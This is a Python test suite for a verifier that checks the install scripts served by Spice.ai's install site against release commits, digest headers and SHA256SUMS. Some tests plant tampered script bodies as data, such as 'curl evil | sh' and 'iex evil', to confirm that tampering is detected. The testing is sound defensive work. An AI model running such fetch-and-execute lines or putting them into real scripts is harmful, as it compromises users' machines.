# Copyright 2024-2026 The Spice.ai OSS Authors
"""Tests for verify_install_site.py, over HTTP against a local stand-in for install.spiceai.org and the GitHub API."""

import base64
import contextlib
import hashlib
import io
import json
import os
import sys
import tempfile
import threading
import unittest
import unittest.mock
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import verify_install_site as v  # noqa: E402

REPO = "spiceai/spiceai"
OLD, OLD_COMMIT = "v2.4.1", "1" * 40
CUR, CUR_COMMIT = "v2.4.2", "2" * 40
SIGNED, SIGNED_COMMIT = "v2.5.0", "5" * 40

SCRIPTS = ("install.sh", "install-spiced.sh", "Install.ps1")


def sha(data):
    return hashlib.sha256(data).hexdigest()


def b64(data):
    return base64.b64encode(hashlib.sha256(data).digest()).decode()


def scripts_at(commit):
    return {name: f"# {name} at {commit}\necho install\n".encode() for name in SCRIPTS}


class World:
    """What GitHub and the site hold. Tests change it, then run the verifier against it."""

    def __init__(self):
        self.files = {}  # (commit, path) -> bytes
        self.tags = {}  # tag -> commit
        self.releases = {}  # tag -> release json
        self.downloads = {}  # path -> bytes
        self.site = {}  # path -> (status, headers, body)
        self.latest = None
        self.extra_headers = {}
        self.redirect_latest = None  # path -> [(name, value)], sent after the site's own headers
        self.auth = []  # (request path, Authorization header or None)

    def add_release(self, tag, commit, signed=False, prerelease=False, draft=False):
        self.tags[tag] = commit
        files = scripts_at(commit)
        for name, body in files.items():
            self.files[(commit, f"install/{name}")] = body
        assets = []
        if signed:
            sums = "".join(f"{sha(body)}  {name}\n" for name, body in sorted(files.items()))
            self.downloads[f"/dl/{tag}/SHA256SUMS"] = sums.encode()
            assets.append({"name": "SHA256SUMS", "digest": f"sha256:{sha(sums.encode())}", "path": f"/dl/{tag}/SHA256SUMS"})
            for name, body in files.items():
                assets.append({"name": name, "digest": f"sha256:{sha(body)}", "path": f"/dl/{tag}/{name}"})
        self.releases[tag] = {"tag_name": tag, "draft": draft, "prerelease": prerelease, "assets": assets}
        if not (draft or prerelease):
            self.latest = tag

    def serve(self, tag):
        """Serve tag's scripts the way the Worker does."""
        commit = self.tags[tag]
        for path, name in v.PATHS.items():
            self.serve_body(path, self.files[(commit, f"install/{name}")], f"{REPO}@{tag}", commit)

    def serve_body(self, path, body, release, commit, digest_of=None):
        digest_of = body if digest_of is None else digest_of
        self.site[path] = (
            200,
            {
                "ETag": f'"{sha(digest_of)}"',
                "Content-Digest": f"sha-256=:{b64(digest_of)}:",
                "Repr-Digest": f"sha-256=:{b64(digest_of)}:",
                "X-Spice-Install-Release": release,
                "X-Spice-Install-Commit": commit,
            },
            body,
        )


class Server:
    def __init__(self, world):
        self.world = world
        world_ref = world

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def send(self, status, body=b"", headers=None, extra=()):
                self.send_response(status)
                for k, val in [*(headers or {}).items(), *extra]:
                    self.send_header(k, val)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def json(self, obj):
                if obj is None:
                    self.send(404, b'{"message": "Not Found"}')
                else:
                    self.send(200, json.dumps(obj).encode(), {"Content-Type": "application/json"})

            def do_GET(self):
                url = urllib.parse.urlsplit(self.path)
                world_ref.auth.append((url.path, self.headers.get("Authorization")))
                if url.path.startswith("/site"):
                    path = url.path[len("/site"):] or "/"
                    status, headers, body = world_ref.site.get(path, (404, {}, b"not found"))
                    return self.send(status, body, headers, world_ref.extra_headers.get(path, ()))
                if url.path.startswith("/dl/"):
                    body = world_ref.downloads.get(url.path)
                    return self.send(200, body) if body is not None else self.send(404)
                api = f"/api/repos/{REPO}/"
                if not url.path.startswith(api):
                    return self.send(404)
                rest = urllib.parse.unquote(url.path[len(api):])
                if rest == "releases/latest" and world_ref.redirect_latest:
                    return self.send(302, b"", {"Location": world_ref.redirect_latest})
                if rest == "releases/latest":
                    return self.json(self.release(world_ref.latest))
                if rest.startswith("releases/tags/"):
                    rel = world_ref.releases.get(rest[len("releases/tags/"):])
                    return self.json(self.release(rel["tag_name"]) if rel and not rel["draft"] else None)
                if rest.startswith("git/ref/tags/"):
                    commit = world_ref.tags.get(rest[len("git/ref/tags/"):])
                    return self.json({"object": {"type": "commit", "sha": commit}} if commit else None)
                if rest.startswith("contents/"):
                    ref = urllib.parse.parse_qs(url.query)["ref"][0]
                    body = world_ref.files.get((ref, rest[len("contents/"):]))
                    return self.send(200, body) if body is not None else self.send(404)
                return self.send(404)

            def release(self, tag):
                if tag is None:
                    return None
                rel = dict(world_ref.releases[tag])
                rel["assets"] = [
                    {"name": a["name"], "digest": a["digest"], "browser_download_url": f"{server.base}{a['path']}"}
                    for a in rel["assets"]
                ]
                return rel

        server = self
        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.base = f"http://127.0.0.1:{self.httpd.server_address[1]}"
        self.thread = threading.Thread(target=self.httpd.serve_forever, kwargs={"poll_interval": 0.01}, daemon=True)

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *exc):
        self.httpd.shutdown()
        self.httpd.server_close()


class VerifyInstallSiteTest(unittest.TestCase):
    def setUp(self):
        self.world = World()
        self.world.add_release(OLD, OLD_COMMIT)
        self.world.add_release(CUR, CUR_COMMIT)
        self.world.serve(CUR)
        self.server = Server(self.world).__enter__()
        self.addCleanup(self.server.__exit__)
        self.site = f"{self.server.base}/site"
        env = {k: val for k, val in os.environ.items() if k not in ("GITHUB_ACTIONS", "GITHUB_STEP_SUMMARY")}
        patcher = unittest.mock.patch.dict(os.environ, env, clear=True)
        patcher.start()
        self.addCleanup(patcher.stop)

    def verify(self, release="latest", allow_earlier=False):
        http = v.Http(f"{self.server.base}/api", "test-token")
        return v.verify(http, self.site, REPO, release, allow_earlier)

    def main(self, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), unittest.mock.patch.dict(os.environ, {"GITHUB_TOKEN": "test-token"}):
            code = v.main(["--site", self.site, "--api-url", f"{self.server.base}/api", *args])
        return code, out.getvalue()

    def test_verifies_the_latest_release_and_writes_exactly_the_verified_scripts(self):
        with tempfile.TemporaryDirectory() as out_dir:
            code, out = self.main("--out-dir", out_dir)
            self.assertEqual(code, 0, out)
            self.assertIn(f"{self.site}: verified\n", out)
            for name, body in scripts_at(CUR_COMMIT).items():
                with open(os.path.join(out_dir, name), "rb") as f:
                    self.assertEqual(f.read(), body)
            self.assertEqual(sorted(os.listdir(out_dir)), sorted(SCRIPTS))
        result = self.verify()
        self.assertEqual(result.problems, [])
        self.assertEqual((result.served_tag, result.commit, result.signed), (CUR, CUR_COMMIT, False))
        self.assertEqual(
            result.notes,
            ["v2.4.2 publishes no SHA256SUMS (it predates v2.5.0), so its scripts are checked against its tagged commit only."],
        )

    def test_writes_nothing_when_a_check_fails(self):
        self.world.serve_body("/install.sh", b"echo pwned\n", f"{REPO}@{CUR}", CUR_COMMIT)
        with tempfile.TemporaryDirectory() as out_dir:
            code, out = self.main("--out-dir", out_dir)
            self.assertEqual(code, 1, out)
            self.assertEqual(os.listdir(out_dir), [])

    def test_body_that_its_digest_headers_do_not_describe(self):
        real = scripts_at(CUR_COMMIT)["install-spiced.sh"]
        tampered = real + b"curl evil | sh\n"
        self.world.serve_body("/install-spiced.sh", tampered, f"{REPO}@{CUR}", CUR_COMMIT, digest_of=real)
        url = f"{self.site}/install-spiced.sh"
        self.assertEqual(
            self.verify().problems,
            [
                f"{url} has ETag {sha(real)}, but its body's sha256 is {sha(tampered)}.",
                f"{url} has a content-digest of sha256 {sha(real)}, but its body's sha256 is {sha(tampered)}.",
                f"{url} has a repr-digest of sha256 {sha(real)}, but its body's sha256 is {sha(tampered)}.",
                f"{url} has sha256 {sha(tampered)}, but install/install-spiced.sh at {CUR_COMMIT} ({CUR}) has {sha(real)}.",
            ],
        )

    def test_body_with_matching_digests_that_is_not_the_tagged_commits_script(self):
        # A pin that drifted from its commit: the headers describe the body, but the body is not the release's.
        other = b"# a script from some other commit\n"
        self.world.serve_body("/", other, f"{REPO}@{CUR}", CUR_COMMIT)
        real = scripts_at(CUR_COMMIT)["install.sh"]
        self.assertEqual(
            self.verify().problems,
            [f"{self.site}/ has sha256 {sha(other)}, but install/install.sh at {CUR_COMMIT} ({CUR}) has {sha(real)}."],
        )

    def test_commit_header_that_is_not_the_commit_of_the_tag(self):
        for path, name in v.PATHS.items():
            self.world.serve_body(path, scripts_at(CUR_COMMIT)[name], f"{REPO}@{CUR}", OLD_COMMIT)
        self.assertEqual(
            self.verify().problems,
            [f"{self.site} has X-Spice-Install-Commit '{OLD_COMMIT}', but {REPO} tag {CUR} points at {CUR_COMMIT}."],
        )

    def test_earlier_release_fails_unless_allowed_and_is_still_verified(self):
        self.world.serve(OLD)
        pin = (
            f"{self.site} serves {OLD}, not {CUR}, the latest release. Pin {CUR} on install.spiceai.org "
            f"('Updating the scripts' in the Worker's README), then run E2E Test Release Installation."
        )
        strict = self.verify()
        self.assertEqual(strict.problems, [pin])
        self.assertEqual((strict.served_tag, strict.commit), (OLD, OLD_COMMIT))

        allowed = self.verify(allow_earlier=True)
        self.assertEqual(allowed.problems, [])
        self.assertEqual(allowed.pending_pin, pin)
        code, out = self.main("--allow-earlier-release")
        self.assertEqual(code, 0, out)
        self.assertIn(f"warning: {pin}\n", out)

        # Allowing an earlier release does not allow an earlier release that was tampered with.
        self.world.serve_body("/Install.ps1", b"iex evil\n", f"{REPO}@{OLD}", OLD_COMMIT)
        self.assertEqual(len(self.verify(allow_earlier=True).problems), 1)

    def test_later_release_than_the_one_asked_for(self):
        self.assertEqual(
            self.verify(release=OLD, allow_earlier=True).problems,
            [f"{self.site} serves {CUR}, which is later than {OLD}."],
        )

    def test_paths_that_name_different_releases(self):
        commit = OLD_COMMIT
        self.world.serve_body("/Install.ps1", scripts_at(commit)["Install.ps1"], f"{REPO}@{OLD}", commit)
        listed = "; ".join(
            f"{path}: {REPO}@{OLD if path == '/Install.ps1' else CUR} at {commit if path == '/Install.ps1' else CUR_COMMIT}"
            for path in v.PATHS
        )
        self.assertEqual(
            self.verify().problems, [f"{self.site} serves different releases on different paths: {listed}."]
        )

    def test_release_header_of_another_repository(self):
        for path, name in v.PATHS.items():
            self.world.serve_body(path, scripts_at(CUR_COMMIT)[name], f"someone/fork@{CUR}", CUR_COMMIT)
        self.assertEqual(
            self.verify().problems,
            [f"{self.site} has X-Spice-Install-Release 'someone/fork@{CUR}', not {REPO}@<tag>."],
        )

    def test_served_release_that_is_a_pre_release(self):
        self.world.add_release("v2.5.0-rc.1", "9" * 40, prerelease=True)
        self.world.latest = CUR
        self.world.serve("v2.5.0-rc.1")
        self.assertEqual(
            self.verify().problems,
            [
                f"{self.site} serves v2.5.0-rc.1: {REPO} v2.5.0-rc.1 is a draft or a pre-release, "
                f"which install.spiceai.org never serves."
            ],
        )

    def test_missing_path_redirect_and_unusable_digest_headers(self):
        self.world.site.pop("/install-spiced.sh")
        self.world.site["/Install.ps1"] = (302, {"Location": "https://example.blob.core.windows.net/Install.ps1"}, b"")
        status, headers, body = self.world.site["/install.sh"]
        headers = dict(headers, ETag=f'W/"{sha(body)}"', **{"Content-Digest": "md5=:AAAA:"})
        del headers["Repr-Digest"]
        self.world.site["/install.sh"] = (status, headers, body)
        self.assertEqual(
            self.verify().problems,
            [
                f"{self.site}/install.sh has ETag 'W/\"{sha(body)}\"', not the quoted sha256 of its body, {sha(body)}.",
                f"{self.site}/install.sh has content-digest 'md5=:AAAA:', not a sha-256 digest of its body, {sha(body)}.",
                f"{self.site}/install.sh has repr-digest None, not a sha-256 digest of its body, {sha(body)}.",
                f"{self.site}/install-spiced.sh answered HTTP 404, not 200: not found",
                f"{self.site}/Install.ps1 answered HTTP 302 to https://example.blob.core.windows.net/Install.ps1, not 200: ",
            ],
        )

    def test_signed_release_whose_scripts_are_its_listed_attached_assets(self):
        self.world.add_release(SIGNED, SIGNED_COMMIT, signed=True)
        self.world.serve(SIGNED)
        result = self.verify()
        self.assertEqual(result.problems, [])
        self.assertEqual((result.served_tag, result.signed, result.notes), (SIGNED, True, []))

    def test_signed_release_whose_manifest_or_asset_disagrees_with_the_served_script(self):
        self.world.add_release(SIGNED, SIGNED_COMMIT, signed=True)
        self.world.serve(SIGNED)
        scripts = scripts_at(SIGNED_COMMIT)
        wrong = "f" * 64
        sums = self.world.downloads[f"/dl/{SIGNED}/SHA256SUMS"].decode()
        sums = sums.replace(sha(scripts["Install.ps1"]), wrong)
        self.world.downloads[f"/dl/{SIGNED}/SHA256SUMS"] = sums.encode()
        assets = self.world.releases[SIGNED]["assets"]
        next(a for a in assets if a["name"] == "install-spiced.sh")["digest"] = f"sha256:{wrong}"
        assets.remove(next(a for a in assets if a["name"] == "install.sh"))
        ps1, spiced = sha(scripts["Install.ps1"]), sha(scripts["install-spiced.sh"])
        self.assertEqual(
            self.verify().problems,
            [
                f"v2.5.0 has no install.sh asset, which {self.site}/ serves.",
                f"v2.5.0 has no install.sh asset, which {self.site}/install.sh serves.",
                f"{self.site}/install-spiced.sh has sha256 {spiced}, but GitHub reports sha256:{wrong} for v2.5.0's install-spiced.sh asset.",
                f"{self.site}/Install.ps1 has sha256 {ps1}, but SHA256SUMS of v2.5.0 lists Install.ps1 with {wrong}.",
            ],
        )

    def test_sha256sums_that_lists_a_script_twice(self):
        # sha256sum --check fails on the first line; the second must not hide it.
        self.world.add_release(SIGNED, SIGNED_COMMIT, signed=True)
        self.world.serve(SIGNED)
        path = f"/dl/{SIGNED}/SHA256SUMS"
        good = self.world.downloads[path].decode()
        line = next(entry for entry in good.splitlines() if entry.endswith("  install.sh"))
        self.world.downloads[path] = (f"{'0' * 64}  install.sh\n" + good).encode()
        with tempfile.TemporaryDirectory() as out_dir:
            code, out = self.main("--out-dir", out_dir)
            self.assertEqual(code, 1, out)
            self.assertEqual(os.listdir(out_dir), [])
        self.assertIn(line, good)
        self.assertEqual(
            self.verify().problems,
            ["SHA256SUMS of v2.5.0 is unreadable: SHA256SUMS lists install.sh more than once."],
        )

    def test_release_from_v2_5_0_on_without_sha256sums(self):
        self.world.add_release(SIGNED, SIGNED_COMMIT, signed=False)
        self.world.serve(SIGNED)
        self.assertEqual(
            self.verify().problems,
            ["v2.5.0 publishes no SHA256SUMS, but every release from v2.5.0 on lists its install scripts in one."],
        )

    def test_unknown_release(self):
        code, out = self.main("--release", "v9.9.9")
        self.assertEqual((code, out), (1, f"error: {REPO} has no published release v9.9.9.\n"))

    def test_token_never_follows_a_redirect_off_the_api(self):
        self.world.redirect_latest = f"{self.server.base}/elsewhere"
        with self.assertRaises(v.VerifyError) as ctx:
            self.verify()
        self.assertEqual(
            str(ctx.exception),
            f"Failed to read {self.server.base}/api/repos/{REPO}/releases/latest: HTTP 302: ",
        )
        self.assertEqual([a for p, a in self.world.auth if p == "/elsewhere"], [])

    def test_token_goes_to_the_github_api_only(self):
        self.world.add_release(SIGNED, SIGNED_COMMIT, signed=True)
        self.world.serve(SIGNED)
        self.assertEqual(self.verify().problems, [])
        sent = {path: auth for path, auth in self.world.auth}
        self.assertTrue(any(p.startswith("/site") for p in sent))
        self.assertTrue(any(p.startswith("/dl/") for p in sent))
        for path, auth in sent.items():
            self.assertEqual(auth, "Bearer test-token" if path.startswith("/api/") else None, path)

    def test_digest_header_parsing(self):
        digest = hashlib.sha256(b"x").digest()
        value = base64.b64encode(digest).decode()
        self.assertEqual(v.digest_header_sha256(f"sha-512=:AAAA:, sha-256=:{value}:"), digest.hex())
        self.assertEqual(v.digest_header_sha256(f"SHA-256=:{value}:"), digest.hex())
        self.assertIsNone(v.digest_header_sha256("sha-256=:not base64!:"))
        self.assertIsNone(v.digest_header_sha256(f"sha-256={value}"))
        self.assertIsNone(v.digest_header_sha256("sha-256=:AAAA:"))
        other = base64.b64encode(hashlib.sha256(b"y").digest()).decode()
        self.assertIsNone(v.digest_header_sha256(f"sha-256=:{value}:, sha-256=:{other}:"))

    def test_digest_header_sent_twice(self):
        body = self.world.site["/install.sh"][2]
        evil = b"curl evil | sh\n"
        # Two Content-Digest fields: the first describes the body, the second does not.
        self.world.extra_headers["/install.sh"] = [("Content-Digest", f"sha-256=:{b64(evil)}:")]
        value = f"sha-256=:{b64(body)}:, sha-256=:{b64(evil)}:"
        self.assertEqual(
            self.verify().problems,
            [f"{self.site}/install.sh has content-digest {value!r}, not a sha-256 digest of its body, {sha(body)}."],
        )


if __name__ == "__main__":
    unittest.main()
